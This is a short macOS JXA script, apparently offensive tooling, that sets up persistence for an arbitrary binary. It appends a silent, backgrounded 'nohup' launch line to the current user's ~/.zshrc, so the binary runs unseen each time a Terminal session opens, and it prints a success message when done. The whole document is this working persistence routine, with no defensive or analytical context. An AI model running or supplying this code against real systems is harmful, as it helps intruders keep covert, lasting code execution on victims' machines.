function Persist(binpath){
ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
var fileMan = $.NSFileManager.defaultManager;
var results = "";
var username = currentApp.systemInfo().shortUserName;
var zpath = "/Users/" + username + "/.zshrc";

if (fileMan.fileExistsAtPath(binpath)){
     try{
     var contents = "\nnohup " + binpath + " > /dev/null 2>&1&";
     var handle = currentApp.openForAccess(Path(zpath), {
     writePermission: true
     })

     currentApp.write(contents, {
     to: zpath,
     startingAt: currentApp.getEof(zpath)
     })
     currentApp.closeAccess(zpath);

     results += "[+] DONE! Added an entry at the bottom of " + zpath + " to run " + binpath + " when a new Terminal session is started";
     }
     catch(error){
	results += error
	results += "\n";
     }

        }
else{
      results += "[-] File " + binpath + " not found\n";
     }


return results

}

//Persist('path_to_macho_binary')
